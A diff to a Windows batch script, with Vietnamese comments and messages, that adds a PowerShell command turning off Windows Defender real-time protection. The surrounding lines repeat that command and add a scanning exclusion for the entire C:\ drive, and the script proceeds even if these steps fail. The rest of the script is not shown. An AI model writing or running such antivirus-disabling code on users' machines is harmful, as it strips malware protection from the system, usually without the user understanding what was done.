@@ -43,6 +43,7 @@ echo.
 :: TẮT TẠM THỜI DEFENDER (Win10+; Win7/8 try/catch)
 :: ========================
 echo Dang tat tam thoi Windows Defender Real-Time Protection...
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}"
 powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath 'C:\' } catch {}"
 echo Da gui lenh tat tam thoi (neu that bai, van tiep tuc).
